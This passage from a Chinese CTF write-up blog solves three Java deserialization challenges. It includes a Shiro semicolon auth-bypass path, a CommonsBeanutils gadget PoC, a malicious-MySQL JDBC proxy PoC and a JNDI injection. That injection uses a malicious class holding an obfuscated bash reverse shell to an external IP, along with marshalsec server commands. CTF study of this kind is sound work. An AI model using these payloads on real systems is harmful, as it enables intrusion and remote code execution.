&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">         <span class="type">MyObjectInputStream</span> <span class="variable">myObjectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(inputStream);</span><br><span class="line">         myObjectInputStream.readObject();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">         var6.printStackTrace();</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;data=&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;admin/hello&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ShrioConfig.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.Config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier(&quot;getDefaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">      <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">      bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">      Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line">       <span class="comment">// 这里 &quot;anon&quot;表示匿名可访问, &quot;authc&quot;是需要鉴权</span></span><br><span class="line">      filterMap.put(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">      filterMap.put(<span class="string">&quot;/login&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">      filterMap.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">bean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">      bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> bean;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier(&quot;adminRealm&quot;)</span> AdminRealm adminRealm)</span> &#123;</span><br><span class="line">      <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">      securityManager.setRealm(adminRealm);</span><br><span class="line">      <span class="keyword">return</span> securityManager;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> AdminRealm <span class="title function_">adminRealm</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AdminRealm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化入口需要鉴权</p><p>去搜一下</p><p><a href="https://mvnrepository.com/artifact/org.apache.shiro/shiro-core/1.5.2">https://mvnrepository.com/artifact/org.apache.shiro/shiro-core/1.5.2</a></p><p>存在<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a>分号绕过鉴权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/web;/admin/hello</span><br></pre></td></tr></table></figure><p>这样鉴权就解决了, 再看一下源码中的过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.Util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> blackList.iterator();</span><br><span class="line"></span><br><span class="line">      String s;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         s = (String)var2.next();</span><br><span class="line">      &#125; <span class="keyword">while</span>(!desc.getName().contains(s));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Don&#x27;t hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl</span><br><span class="line">org.hibernate.tuple.component.PojoComponentTuplizer</span><br><span class="line">java.security.SignedObject</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>用来防御<code>Hibernate</code>反序列化链和<code>Jdbc</code>反序列化链</p><p>不过这里Shrio内置了<code>commons-beanutils1.9.4</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240819134609766.png" alt="image-20240819134609766"></p><p>可以直接打CB链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.n4c1.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">poc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF_DOC\\练习tmp\\[MTCTF2022]easyjava\\easyjava\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;codes&#125;;</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Tools.setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        Tools.setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(priorityQueue);</span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        Tools.InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看题目讨论这题环境有问题, 这里本地过了</p><h2 id="羊城杯-2020-a-piece-of-java"><a href="#羊城杯-2020-a-piece-of-java" class="headerlink" title="[羊城杯 2020]a_piece_of_java"></a>[羊城杯 2020]a_piece_of_java</h2><p>查看源码, <code>MainController</code>中的<code>/hello</code>路由对cookie进行了反序列化</p><p>再看一下这个自定义的反序列化方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(bais, <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        var5.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用了一个SerialKiller来反序列化, 去看一下他使用的serialkiller.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- serialkiller.conf --&gt;</span><br><span class="line">&lt;config&gt;</span><br><span class="line">    &lt;refresh&gt;6000&lt;/refresh&gt;</span><br><span class="line">    &lt;mode&gt;</span><br><span class="line">        &lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;</span><br><span class="line">        &lt;profiling&gt;false&lt;/profiling&gt;</span><br><span class="line">    &lt;/mode&gt;</span><br><span class="line">    &lt;blacklist&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/blacklist&gt;</span><br><span class="line">    &lt;whitelist&gt;</span><br><span class="line">        &lt;regexp&gt;gdufs\..*&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.lang\..*&lt;/regexp&gt;</span><br><span class="line">    &lt;/whitelist&gt;</span><br><span class="line">&lt;/config&gt;</span><br></pre></td></tr></table></figure><p>白名单gdufs和java.lang</p><p>这样一来, 虽然我们在lib目录下看见了<code>Common-collections3.2.1</code>的依赖, 但由于这里的白名单就没办法直接打CC链了(并且SerialKiller自带对cc依赖中恶意类的过滤)</p><p>既然让打gdufs, 那就去gdufs找切入点</p><p>在gdufs.challenge.web.model.DatabaseInfo中发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821233124059.png" alt="image-20240821233124059"></p><p>它实现了Info接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: web-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/gdufs/challenge/web/model/Info.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getAllInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的connect可以打jdbc, 他分别被getConnection和checkAllInfo调用, 那么接下来就是寻找同名方法</p><p>在<code>gdufs.challenge.web.invocation</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// java.lang.reflect.InvocationHandler</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getAllInfo&quot;</span>) &amp;&amp; !<span class="built_in">this</span>.info.checkAllInfo().booleanValue()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.info, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写的invoke方法中调用了checkAllInfo且调用者可控</p><p>这个类继承<code>java.lang.reflect.InvocationHandler</code>, 他是一个动态代理的handler, 我们只需要给<code>DatabaseInfo</code>类套一层动态代理, 反序列化后invoke就会被执行, 进而调用connect, 然后伪造sever打cc链</p><p>注意由于spring boot项目的包结构导致无法直接导入jar包然后<code>import gdufs.challenge.web.model.DatabaseInfo</code>等, 这里我手动创建了需要的类并导入题目jar包的依赖</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822141801157.png" alt="image-20240822141801157"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DatabaseInfo</span> <span class="variable">databaseInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line">        databaseInfo.setUsername(<span class="string">&quot;yso_CommonsCollections1_calc&quot;</span>);</span><br><span class="line">        databaseInfo.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        databaseInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        databaseInfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InfoInvocationHandler</span> <span class="variable">infoInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseInfo);</span><br><span class="line">        <span class="type">Info</span> <span class="variable">info</span> <span class="operator">=</span> (Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(info);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>伪造mysql服务器</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>这里本地能打通cc, 不i知道为什么弹不了shell</p><p>最后用jdbc文件读取了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">databaseInfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360&quot;</span>);</span><br><span class="line">databaseInfo.setUsername(<span class="string">&quot;fileread_/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822153453150.png" alt="image-20240822153453150"></p><h2 id="红明谷CTF-2021-JavaWeb"><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h2><p>提示<code>/login</code>, 访问后返回<code>/json</code>, 不难看出为shiro</p><p><code>/json</code>不能直接访问, 可以用shiro常用的方法绕过鉴权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /;/json HTTP/1.1</span><br></pre></td></tr></table></figure><p>传入json数据可以看见报错, wp说是jackson的报错</p><p>打<code>ch.qos.logback.core.db.JNDIConnectionSource</code> jndi注入</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse_shell_static</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.di.LDAPRefServer http://107.148.75.202:8000/#reverse_shell_static 1389</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/;/json</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1fa50337-4466-472a-83f9-b61579c102f1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>101</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="selector-attr">[<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="string">&quot;jndiLocation&quot;</span>:<span 